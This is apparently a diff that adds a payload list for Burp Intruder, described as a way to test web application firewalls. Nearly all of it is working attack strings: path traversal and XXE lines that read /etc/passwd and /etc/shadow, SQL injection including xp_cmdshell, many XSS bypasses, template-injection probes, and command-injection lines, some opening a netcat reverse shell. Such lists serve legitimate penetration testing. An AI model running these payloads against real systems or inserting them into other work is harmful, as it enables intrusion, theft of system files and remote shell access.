@@ -1,0 +1,115 @@
+/*
+* WAF Bypass Payloads for Burp Intruder
+* Usage: Load this list into Burp Intruder to test for WAF implementation weaknesses.
+*/
+
+/* Generic Long Strings / Overflow Attempts */
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
+/../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/..%c0%af/etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+
+/* SQL Injection WAF Bypasses */
+' or 1=1 -- -
+' OR '1'='1
+" OR "1"="1
+' OR 1=1/*
+'/**/OR/**/1=1
+'/*%00*/OR/*%00*/1=1
+'+OR+1=1
+%27%20OR%201%3D1
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+/*!50000SELECT*/ * FROM users
+/*!12345SELECT*/ 1,2,3
+UN/**/ION SE/**/LECT
+%55NION(%53ELECT 1,2,3)-- -
++OR+1=1+let+x=1
+' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user()))) -- -
+-1 UNION SELECT 1, version(), 3 -- +
+' OR 'x'='x' #
+1; EXEC xp_cmdshell('dir'); --
+
+/* XSS WAF Bypasses */
+<script>alert(1)</script>
+<sCrIpT>alert(1)</sCrIpT>
+<script>alert(1)
+<script>alert(1);</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)//
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe/src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)>
+<textarea oninput=alert(1)>
+<a href="javascript:alert(1)">Click me</a>
+<a href="javas  cript:alert(1)">Click me</a>
+<a href="javascript:\u0061lert(1)">Click me</a>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setTimeout('alert(1)',0)</script>
+<img src=x:alert(1) onerror=eval(src)>
+<img src="/" =_= title="onerror='prompt(1)'">
+<--`<img/src=` onerror=alert(1)> --!>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<link rel=import href="http://127.0.0.1/xss.js">
+
+/* Command Injection / RCE Bypasses */
+; ls -la
+| ls -la
+|| ls -la
+& ls -la
+&& ls -la
+$(ls -la)
+`ls -la`
+cat /etc/passwd
+/bin/cat /etc/passwd
+cat%20/etc/passwd
+cat${IFS}/etc/passwd
+cat$u/etc$u/passwd$u
+echo$IFS"RCE"
+whoami
+id
+ping -c 1 127.0.0.1
+;netcat -e /bin/sh 127.0.0.1 1337
+|netcat -e /bin/sh 127.0.0.1 1337
+&netcat -e /bin/sh 127.0.0.1 1337
+
+/* Local File Inclusion (LFI) Bypasses */
+/etc/passwd
+/etc/shadow
+/var/www/html/index.php
+../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+%252e%252e%252fetc%252fpasswd
+..././..././..././..././etc/passwd
+....//....//....//....//etc/passwd
+
+/* Server Side Template Injection (SSTI) */
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+
+/* XML External Entity (XXE) */
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root>&xxe;</root>
+<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://127.0.0.1/"> ]> <root>&xxe;</root>
+
+/* Polyglots (Mixed Contexts) */
+javascript://%250Aalert(1)//"  /*
+'"><script>alert(1)</script>
+" onfocus=alert(1) "
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+jaVasCript:/*-/*`/*\`/*'/*"/**/
+<script>+-+-1-+-+alert(1)</script>
+%22%3e%3cscript%3ealert(1)%3c%2fscript%3e
+"><img src=x onerror=alert(1)>
+'';!--"<XSS>=&{()}
